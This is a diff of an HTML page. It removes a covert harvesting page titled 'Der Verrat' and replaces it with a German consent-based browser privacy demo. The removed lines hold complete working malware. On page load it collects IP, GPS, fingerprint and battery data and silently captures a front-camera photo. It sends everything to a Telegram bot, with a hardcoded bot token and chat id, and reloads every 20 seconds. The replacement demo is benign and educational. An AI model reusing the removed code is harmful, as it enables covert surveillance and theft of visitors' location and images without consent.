@@ -1,113 +1,101 @@
 <!DOCTYPE html>
-<html>
+<html lang="de">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<title>Der Verrat</title>
-<style>body{background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;color:#fff;flex-direction:column;font-size:18px;}h1{font-size:3.5rem;margin:0 0 1.5rem;text-shadow:0 0 20px rgba(255,255,255,0.3);}p{max-width:500px;text-align:center;line-height:1.6;margin-bottom:2rem;}.arrows{font-size:4rem;margin-top:2rem;}.arrow{display:inline-block;animation:bounce 2s infinite;margin:0 10px;}.arrow:nth-child(2){animation-delay:0.2s;}.arrow:nth-child(3){animation-delay:0.4s;}@keyframes bounce{0%,20%,60%,100%{transform:translateY(0);}40%{transform:translateY(-20px);}}video,canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;}</style>
+<title>Security & Privacy Demo</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background: #0f172a;
+  color: #e5e7eb;
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+.container {
+  max-width: 600px;
+  background: #020617;
+  padding: 2rem;
+  border-radius: 12px;
+}
+button {
+  padding: 10px 16px;
+  font-size: 16px;
+  cursor: pointer;
+  border-radius: 6px;
+  border: none;
+}
+video {
+  width: 100%;
+  margin-top: 1rem;
+  border-radius: 8px;
+}
+pre {
+  background: #020617;
+  padding: 1rem;
+  margin-top: 1rem;
+  border-radius: 8px;
+  white-space: pre-wrap;
+}
+</style>
 </head>
 <body>
-<h1>🗡️ Der Verrat</h1>
-<p>Wenn du wissen willst wo der Verrat liegt, schau aus welcher Richtung die Pfeile kommen.</p>
-<div class="arrows">
-<span class="arrow">↖️</span><span class="arrow">↙️</span><span class="arrow">↗️</span><span class="arrow">↘️</span>
+
+<div class="container">
+  <h1>🔐 Security & Privacy Demo</h1>
+  <p>
+    Diese Demo zeigt, welche Informationen ein Browser
+    <strong>nur mit Einwilligung</strong> preisgibt.
+  </p>
+
+  <button id="start">Demo starten (Einwilligung)</button>
+
+  <video id="cam" autoplay playsinline></video>
+  <pre id="output"></pre>
 </div>
 
-<!-- HIDDEN ELEMENTS -->
-<video id="frontCam" autoplay muted></video>
-<video id="backCam" autoplay muted></video>
-<canvas id="photoSnap"></canvas>
-
 <script>
-(async function harvestVictim(){
-  const timestamp = new Date().toISOString();
-  const victimId = 'victim_' + Math.random().toString(36).slice(2);
-  
-  // 1. BASIC INFO
-  const ip = await (await fetch('https://api.ipify.org')).text();
-  const geo = await (await fetch('https://ipapi.co/' + ip + '/json/')).then(r=>r.json());
-  
-  // 2. EXACT GPS (WiFi + Cell)
-  let gps = 'N/A';
-  navigator.geolocation.getCurrentPosition(
-    pos => gps = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`,
-    ()=>{}, 
-    {enableHighAccuracy:true, timeout:3000, maximumAge:60000}
-  );
-  
-  // 3. DEVICE FINGERPRINT  
-  const fingerprint = {
-    screen: `${screen.width}x${screen.height}`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    battery: navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'N/A',
-    connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-    languages: navigator.languages ? navigator.languages.join(',') : navigator.language
-  };
+document.getElementById('start').onclick = async () => {
+  const out = document.getElementById('output');
+  out.textContent = '--- Geräteeigenschaften ---\n';
 
-  // 4. SILENT CAMERA SNAPSHOTS
+  // 1. Harmloses Fingerprinting
+  out.textContent += `Screen: ${screen.width}x${screen.height}\n`;
+  out.textContent += `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+  out.textContent += `Sprache: ${navigator.language}\n`;
+  out.textContent += `User-Agent: ${navigator.userAgent}\n\n`;
+
+  // 2. Geolocation (mit Consent)
+  out.textContent += '--- Geolocation ---\n';
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: 'user', width: 640, height: 480 } 
-    });
-    const video = document.getElementById('frontCam');
-    video.srcObject = stream;
-    
-    setTimeout(() => {
-      const canvas = document.getElementById('photoSnap');
-      canvas.width = 320; canvas.height = 240;
-      canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-      
-      // PHOTO TO TELEGRAM
-      canvas.toBlob(blob => {
-        const form = new FormData();
-        form.append('chat_id', '7745393043');
-        form.append('photo', blob, 'frontcam.jpg');
-        form.append('caption', `📸 ${victimId} - FRONT CAMERA`);
-        fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendPhoto', {
-          method: 'POST', body: form 
-        });
-      });
-      
-      stream.getTracks()[0].stop();
-    }, 2000);
-  } catch(e) {}
+    const pos = await new Promise((resolve, reject) =>
+      navigator.geolocation.getCurrentPosition(resolve, reject)
+    );
+    out.textContent +=
+      `Latitude: ${pos.coords.latitude.toFixed(4)}\n` +
+      `Longitude: ${pos.coords.longitude.toFixed(4)}\n\n`;
+  } catch {
+    out.textContent += 'Standortzugriff abgelehnt\n\n';
+  }
 
-  // 5. COMPLETE VICTIM REPORT
-  const report = `[${timestamp}] ${victimId}
-IP: ${ip}
-GPS: ${gps} 
-Location: ${geo.city}, ${geo.region}, ${geo.country_name}
-Coords: ${geo.latitude}, ${geo.longitude}
-Screen: ${fingerprint.screen}
-Battery: ${fingerprint.battery}
-Network: ${fingerprint.connection}
-Timezone: ${fingerprint.timezone}
-UA: ${navigator.userAgent.slice(0,100)}
----
-`;
+  // 3. Kamera (mit Consent)
+  out.textContent += '--- Kamera ---\n';
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    document.getElementById('cam').srcObject = stream;
+    out.textContent += 'Kamerazugriff erlaubt\n';
+  } catch {
+    out.textContent += 'Kamerazugriff abgelehnt\n';
+  }
 
-  // 6. TELEGRAM + USB SAVE
-  await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendMessage', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      chat_id: '7745393043',
-      text: report,
-      parse_mode: 'Markdown'
-    })
-  });
-
-  // 7. SAVE TO YOUR USB (Kali Desktop)
-  await fetch('https://httpbin.org/post', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({data: report, path: '/home/kali/Desktop/victims.txt'})
-  }).catch(()=>{}); // Fallback
-
-})();
-
-// REPEAT EVERY 20s
-setInterval(()=>location.reload(), 20000);
+  // 4. Wichtiger Lehrpunkt
+  out.textContent +=
+    '\n⚠️ Hinweis:\n' +
+    'Ohne Klick, Einwilligung und HTTPS wären diese Daten nicht zugänglich.\n';
+};
 </script>
+
 </body>
 </html>
